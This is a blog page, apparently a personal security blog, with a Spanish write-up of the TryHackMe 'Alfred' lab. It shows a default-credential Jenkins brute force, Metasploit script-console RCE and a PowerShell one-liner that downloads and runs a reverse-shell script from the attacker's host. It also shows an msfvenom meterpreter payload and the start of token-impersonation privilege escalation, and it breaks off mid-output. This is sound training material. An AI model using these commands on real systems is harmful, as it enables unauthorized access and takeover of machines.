@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            Alfred [TryHackMe]  &ndash;
+        
+        K3ssDev
+:/var/log$  
+    </title>
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://k3ssdev.github.io/css/styles.c5c0ca1ad04162d8cbbaa1291d7d0e5d96b9ad04a6b2b68c8ed577d7eabb970ab79d33477f3b13c760eed232f5f642bdcbce1f28bf3f057c36edf5e6c41d203c.css integrity="sha512-xcDKGtBBYtjLuqEpHX0OXZa5rQSmsraMjtV31&#43;q7lwq3nTNHfzsTx2Du0jL19kK9y84fKL8/BXw27fXmxB0gPA==" />
+<meta name="author" content="Alberto Pérez" />
+
+    
+        <meta name="keywords" content='Access tokens, Easy, Jenkins, Meterpreter, Privilege Escalation, TryHackMe, Windows' />
+    
+    
+        <meta name="description" content="nda sala del bloque “Advanced Exploitation” en el path “Offensive Pentesting”. En esta sala se aprende a explotar una configuración incorrecta en Jenkins, un servidor de automatización. Se utilizará Nishang en una aplicación Windows para obtener acceso inicial y escalada de privilegios." />
+    
+
+<meta property="og:site_name"
+    content='K3ssDev
+:/var/log$  ' />
+
+    <meta property="og:title" content="Alfred [TryHackMe]" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Alberto Pérez" />
+    <meta
+        property="article:published_time"
+        content='2023-08-29T00:00:00Z&#43;0200' />
+    
+        
+            <meta property="article:tag" content="Access tokens" />
+        
+            <meta property="article:tag" content="Easy" />
+        
+            <meta property="article:tag" content="Jenkins" />
+        
+            <meta property="article:tag" content="Meterpreter" />
+        
+            <meta property="article:tag" content="Privilege Escalation" />
+        
+            <meta property="article:tag" content="TryHackMe" />
+        
+            <meta property="article:tag" content="Windows" />
+        
+    
+    <meta property="og:url" content="https://k3ssdev.github.io/posts/alfred/" />
+    <meta property="og:image"
+        content='https://k3ssdev.github.io/images/post_pics/alfred/alfred.png
+        ' />
+    
+        <meta property="og:description" content="Introducción La segunda sala del bloque “Advanced Exploitation” en el path “Offensive Pentesting”. En esta sala se aprende a explotar una configuración incorrec" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='k3ssdev.github.io'
+/>
+<meta property="twitter:url" content="https://k3ssdev.github.io/posts/alfred/" />
+
+
+    <meta name="twitter:title" content="Alfred [TryHackMe]" />
+    
+    <meta name="twitter:image"
+        content='https://k3ssdev.github.io/images/post_pics/alfred/alfred.png
+        ' />
+    
+        <meta name="twitter:description" content="Introducción La segunda sala del bloque “Advanced Exploitation” en el path “Offensive Pentesting”. En esta sala se aprende a explotar una configuración incorrec" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' />
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">K3ssDev
+:/var/log$  </a>
+                        
+                    </h1>
+                    
+                        <label id="hamburger-menu" for="main-nav-toggler">
+                            &#xf85b;
+                        </label>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="mailto:k3ssdev@proton.me">
+    
+    
+        &#xf6ed;
+    
+    <span>
+        Email
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://www.linkedin.com/in/alberto-perez-del-rio/">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        Linkedin
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/k3ssdev">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+
+    </div>
+    
+        <div id="sidebar_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+        
+    
+<script src="https://tryhackme.com/badge/1277295"></script>
+
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>Alfred [TryHackMe]</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2023-08-29
+
+</p>
+    
+    
+    
+        <figure style="margin: 0">
+            <img src="/images/post_pics/alfred/alfred.png" alt="" />
+            
+        </figure>
+    
+    
+    <div><h2 id="introducción">Introducción</h2>
+<p>La segunda sala del bloque “Advanced Exploitation” en el path “Offensive Pentesting”. En esta sala se aprende a explotar una configuración incorrecta en Jenkins, un servidor de automatización. Se utilizará Nishang en una aplicación Windows para obtener acceso inicial y escalada de privilegios. En THM viene etiquetada como una sala fácil, pero powershell me sigue costando, lo que la vuelve un poco más complicada para mi.</p>
+<h2 id="task-1---desplegar-la-máquina">Task 1 - Desplegar la máquina</h2>
+<h3 id="paso-1">Paso 1:</h3>
+<ul>
+<li>Escaneo la máquina desplegada para descubrir los servicios. Encuentro 3 puertos abiertos.</li>
+<li>Se encuentra página de login en el puerto 8080, usa Jenkins.</li>
+<li>Pruebo user/pass por defecto admin:admin y logro acceso. Versión Jenkins ver. 2.190.1</li>
+<li>Encuentro posible método RCE - <a href="https://www.exploit-db.com/exploits/46352">Jenkins 2.150.2 - Remote Command Execution (Metasploit)</a></li>
+<li>Obtengo acceso con Meterpreter. Pruebo el acceso tambien de forma manual con el script de powershell.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Escaneo inicial con salida a fichero</span>
+</span></span><span style="display:flex;"><span>sudo nmap -sS --min-rate <span style="color:#ae81ff">5000</span> -p- -Pn -v -oN nmap_inicial 10.10.123.255
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Listo y filtro los puertos en nmap_inicial</span>
+</span></span><span style="display:flex;"><span>ports<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat nmap_inicial | grep <span style="color:#e6db74">&#39;^[0-9]&#39;</span> | cut -d <span style="color:#e6db74">&#39;/&#39;</span> -f1 | xargs | tr <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#e6db74">&#39;,&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Escaneo final con los puertos guardados</span>
+</span></span><span style="display:flex;"><span>nmap -p$ports -sC -sV -Pn -oN nmap_final 10.10.123.255
+</span></span></code></pre></div><ul>
+<li>Resultado nmap:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.123.255
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.049s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp   open  http
+</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server
+</span></span><span style="display:flex;"><span>8080/tcp open  http-proxy
+</span></span></code></pre></div><ul>
+<li>Brute-force login con Metasploit:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Busco Jenkins en metasploit</span>
+</span></span><span style="display:flex;"><span>msf6 &gt; search Jenkins
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#   Name                                                  Disclosure Date  Rank       Check  Description</span>
+</span></span><span style="display:flex;"><span>   -   ----                                                  ---------------  ----       -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   exploit/windows/misc/ibm_websphere_java_deserialize   2015-11-06       excellent  No     IBM WebSphere RCE Java Deserialization Vulnerability
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>   exploit/multi/http/jenkins_metaprogramming            2019-01-08       excellent  Yes    Jenkins ACL Bypass and Metaprogramming RCE
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>   exploit/linux/http/jenkins_cli_deserialization        2017-04-26       excellent  Yes    Jenkins CLI Deserialization
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>   exploit/linux/misc/jenkins_ldap_deserialize           2016-11-16       excellent  Yes    Jenkins CLI HTTP Java Deserialization Vulnerability
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>   exploit/linux/misc/jenkins_java_deserialize           2015-11-18       excellent  Yes    Jenkins CLI RMI Java Deserialization Vulnerability
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span>   post/multi/gather/jenkins_gather                                       normal     No     Jenkins Credential Collector
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">6</span>   auxiliary/gather/jenkins_cred_recovery                                 normal     Yes    Jenkins Domain Credential Recovery
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">7</span>   auxiliary/scanner/jenkins/jenkins_udp_broadcast_enum                   normal     No     Jenkins Server Broadcast Enumeration
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">8</span>   exploit/multi/http/jenkins_xstream_deserialize        2016-02-24       excellent  Yes    Jenkins XStream Groovy classpath Deserialization Vulnerability
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">9</span>   auxiliary/scanner/http/jenkins_enum                                    normal     No     Jenkins-CI Enumeration
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">10</span>  auxiliary/scanner/http/jenkins_login                                   normal     No     Jenkins-CI Login Utility
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">11</span>  exploit/multi/http/jenkins_script_console             2013-01-18       good       Yes    Jenkins-CI Script-Console Java Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">12</span>  auxiliary/scanner/http/jenkins_command                                 normal     No     Jenkins-CI Unauthenticated Script-Console Scanner
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">13</span>  exploit/linux/misc/opennms_java_serialize             2015-11-06       normal     No     OpenNMS Java Object Unserialization Remote Code Execution
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 &gt; use <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>scanner/http/jenkins_login<span style="color:#f92672">)</span> &gt; set RHOSTS 10.10.123.255
+</span></span><span style="display:flex;"><span>RHOSTS <span style="color:#f92672">=</span>&gt; 10.10.123.255
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Elijo el modulo de login y reviso opciones</span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>auxiliary/scanner/http/jenkins_login<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name              Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----              ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   BLANK_PASSWORDS   true             no        Try blank passwords <span style="color:#66d9ef">for</span> all users
+</span></span><span style="display:flex;"><span>   BRUTEFORCE_SPEED  <span style="color:#ae81ff">5</span>                yes       How fast to bruteforce, from <span style="color:#ae81ff">0</span> to <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>   DB_ALL_CREDS      true             no        Try each user/password couple stored in the current database
+</span></span><span style="display:flex;"><span>   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+</span></span><span style="display:flex;"><span>   DB_ALL_USERS      false            no        Add all users in the current database to the list
+</span></span><span style="display:flex;"><span>   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database <span style="color:#f92672">(</span>Accepted: none, user, user&amp;realm<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   HTTP_METHOD       POST             yes       The HTTP method to use <span style="color:#66d9ef">for</span> the login <span style="color:#f92672">(</span>Accepted: GET, POST<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   PASSWORD                           no        A specific password to authenticate with
+</span></span><span style="display:flex;"><span>   PASS_FILE                          no        File containing passwords, one per line
+</span></span><span style="display:flex;"><span>   Proxies                            no        A proxy chain of format type:host:port<span style="color:#f92672">[</span>,type:host:port<span style="color:#f92672">][</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   RHOSTS            10.10.123.255    yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+</span></span><span style="display:flex;"><span>   RPORT             <span style="color:#ae81ff">8080</span>             yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   SSL               false            no        Negotiate SSL/TLS <span style="color:#66d9ef">for</span> outgoing connections
+</span></span><span style="display:flex;"><span>   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works <span style="color:#66d9ef">for</span> a host
+</span></span><span style="display:flex;"><span>   TARGETURI                          no        The path to the Jenkins-CI application
+</span></span><span style="display:flex;"><span>   THREADS           <span style="color:#ae81ff">1</span>                yes       The number of concurrent threads <span style="color:#f92672">(</span>max one per host<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   USERNAME                           no        A specific username to authenticate as
+</span></span><span style="display:flex;"><span>   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
+</span></span><span style="display:flex;"><span>   USER_AS_PASS      false            no        Try the username as the password <span style="color:#66d9ef">for</span> all users
+</span></span><span style="display:flex;"><span>   USER_FILE                          no        File containing usernames, one per line
+</span></span><span style="display:flex;"><span>   VERBOSE           true             yes       Whether to print output <span style="color:#66d9ef">for</span> all attempts
+</span></span><span style="display:flex;"><span>   VHOST                              no        HTTP server virtual host
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Selecciono wordlist de user/pass comunes</span>
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>scanner/http/jenkins_login<span style="color:#f92672">)</span> &gt; set userpass_file /usr/share/wordlists/metasploit/default_userpass_for_services_unhash.txt
+</span></span><span style="display:flex;"><span>userpass_file <span style="color:#f92672">=</span>&gt; /usr/share/wordlists/metasploit/default_userpass_for_services_unhash.txt
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>scanner/http/jenkins_login<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Encuentro login</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.123.255:8080 - Login Successful: admin:admin
+</span></span></code></pre></div><ul>
+<li>RCE con Metasploit:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Configuro LHOST y RHOSTS</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/jenkins_script_console<span style="color:#f92672">)</span> &gt; set LHOST tun0
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/jenkins_script_console<span style="color:#f92672">)</span> &gt; set RHOSTS 10.10.199.157
+</span></span><span style="display:flex;"><span>RHOSTS <span style="color:#f92672">=</span>&gt; 10.10.199.157
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/jenkins_script_console<span style="color:#f92672">)</span> &gt; set RPORT <span style="color:#ae81ff">8080</span>
+</span></span><span style="display:flex;"><span>RPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">8080</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Indico user/pass</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/jenkins_script_console<span style="color:#f92672">)</span> &gt; set USERNAME admin
+</span></span><span style="display:flex;"><span>USERNAME <span style="color:#f92672">=</span>&gt; admin
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/jenkins_script_console<span style="color:#f92672">)</span> &gt; set PASSWORD admin
+</span></span><span style="display:flex;"><span>PASSWORD <span style="color:#f92672">=</span>&gt; admin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ejecuto el exploit</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/jenkins_script_console<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.14.50.184:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Checking access to the script console
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Logging in...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using CSRF token: <span style="color:#e6db74">&#39;f977d727b64f7f6bcda0835d0bd4730dc4b348c303de26e296cc95358eab60e1&#39;</span> <span style="color:#f92672">(</span>Jenkins-Crumb style v1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.199.157:8080 - Sending command stager...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command Stager progress -   2.06% <span style="color:#66d9ef">done</span> <span style="color:#f92672">(</span>2048/99626 bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command Stager progress -   4.11% <span style="color:#66d9ef">done</span> <span style="color:#f92672">(</span>4096/99626 bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command Stager progress -   6.17% <span style="color:#66d9ef">done</span> <span style="color:#f92672">(</span>6144/99626 bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175686</span> bytes<span style="color:#f92672">)</span> to 10.10.199.157
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.14.50.184:4444 -&gt; 10.10.199.157:49212<span style="color:#f92672">)</span> at 2023-08-28 18:01:49 +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; ls
+</span></span><span style="display:flex;"><span>Listing: C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=======================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode              Size      Type  Last modified              Name
+</span></span><span style="display:flex;"><span>----              ----      ----  -------------              ----
+</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">0</span>         fil   2023-08-28 17:41:44 +0200  .lastStarted
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><ul>
+<li>Reverse shell manual:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Creo servidor con python donde tengo el script de powershell</span>
+</span></span><span style="display:flex;"><span> python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Creo un listener con netcat</span>
+</span></span><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ejecuto comando en consola-web a traves de un proyecto nuevo y se crea la conexion</span>
+</span></span><span style="display:flex;"><span>powershell iex <span style="color:#f92672">(</span>New-Object Net.WebClient<span style="color:#f92672">)</span>.DownloadString<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&#39;</span><span style="color:#f92672">)</span>;Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+</span></span></code></pre></div><h2 id="task-2---switching-shells">Task 2 - Switching Shells</h2>
+<h2 id="paso-2">Paso 2:</h2>
+<ul>
+<li>Se crea un payload con msfvenom.</li>
+<li>El payload contiene el mismo código que el script anterior shikata_ga_nai.</li>
+<li>El shell será un reverse_tcp de meterpreter.</li>
+<li>Es lo mismo que lo realizado en el paso 1 usando directamente el exploit en Metasploit.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Genero payload con msfvenom</span>
+</span></span><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST<span style="color:#f92672">=</span>10.14.50.184 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">1234</span> -f exe -o shell-name.exe 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">1</span> compatible encoders
+</span></span><span style="display:flex;"><span>Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86/shikata_ga_nai
+</span></span><span style="display:flex;"><span>x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">381</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">381</span>
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">381</span> bytes
+</span></span><span style="display:flex;"><span>Final size of exe file: <span style="color:#ae81ff">73802</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: shell-name.exe
+</span></span></code></pre></div><h2 id="task-3---privilege-escalation">Task 3 - Privilege Escalation</h2>
+<h3 id="paso-3">Paso 3:</h3>
+<ul>
+<li>Se usará la suplantación de token para conseguir acceso privilegiado (info sobre tokens <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)">https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)</a>.</li>
+<li>Abusing Token Privileges For LPE <a href="https://www.exploit-db.com/papers/42556">https://www.exploit-db.com/papers/42556</a></li>
+<li>Cargo módulo de powershell en meterpreter y ejecuto whoami /priv para ver privilegios.</li>
+<li>Uso impersonate_token para conseguir el token de acceso.</li>
+<li>Migro el proceso de meterpreter a services.exe para conseguir un token de privilegio más elevado.</li>
+<li>Revisión de tokens en meterpreter:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; load powershell 
+</span></span><span style="display:flex;"><span>Loading extension powershell...Success.
+</span></span><span style="display:flex;"><span>meterpreter &gt; powershell_shell 
+</span></span><span style="display:flex;"><span>PS &gt; whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                  Description                               State
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================</span> <span style="color:#f92672">=========================================</span> <span style="color:#f92672">=======</span>
+</span></span><span style="display:flex;"><span>SeIncreaseQuotaPrivilege        Adjust memory quotas <span style="color:#66d9ef">for</span> a process        Enabled
+</span></span><span style="display:flex;"><span>SeSecurityPrivilege             Manage auditing and security log          Enabled
+</span></span><span style="display:flex;"><span>SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled
+</span></span><span style="display:flex;"><span>SeLoadDriverPrivilege           Load and unload device drivers            Enabled
+</span></span><span style="display:flex;"><span>SeSystemProfilePrivilege        Profile system performance                Enabled
+</span></span><span style="display:flex;"><span>SeSystemtimePrivilege           Change the system time                    Enabled
+</span></span><span style="display:flex;"><span>SeProfileSingleProcessPrivilege Profile single process                    Enabled
+</span></span><span style="display:flex;"><span>SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled
+</span></span><span style="display:flex;"><span>SeCreatePagefilePrivilege       Create a pagefile                         Enabled
+</span></span><span style="display:flex;"><span>SeBackupPrivilege               Back up files and directories             Enabled
+</span></span><span style="display:flex;"><span>SeRestorePrivilege              Restore files and directories             Enabled
+</span></span><span style="display:flex;"><span>SeShutdownPrivilege             Shut down the system                      Enabled
+</span></span><span style="display:flex;"><span>SeDebugPrivilege                Debug programs                            Enabled
+</span></span><span style="display:flex;"><span>SeSystemEnvironmentPrivilege    Modify firmware environment values        Enabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
+</span></span><span style="display:flex;"><span>SeRemoteShutdownPrivilege       Force shutdown from a remote system       Enabled
+</span></span><span style="display:flex;"><span>SeUndockPrivilege               Remove computer from docking station      Enabled
+</span></span><span style="display:flex;"><span>SeManageVolumePrivilege         Perform volume maintenance tasks          Enabled
+</span></span><span style="display:flex;"><span>SeImpersonatePrivilege          Impersonate a client after authentication Enabled
+</span></span><span style="display:flex;"><span>SeCreateGlobalPrivilege         Create global objects                     Enabled
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled
+</span></span><span style="display:flex;"><span>SeTimeZonePrivilege             Change the time zone                      Enabled
+</span></span><span style="display:flex;"><span>SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled
+</span></span></code></pre></div><ul>
+<li>Impersonate_token en meterpreter:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; load incognito 
+</span></span><span style="display:flex;"><span>Loading extension incognito...Success.
+</span></span><span style="display:flex;"><span>meterpreter &gt; list_tokens -g
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Warning: Not currently running as SYSTEM, not all tokens will be available
+</span></span><span style="display:flex;"><span>             Call rev2self <span style="color:#66d9ef">if</span> primary process token is SYSTEM
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Delegation Tokens Available
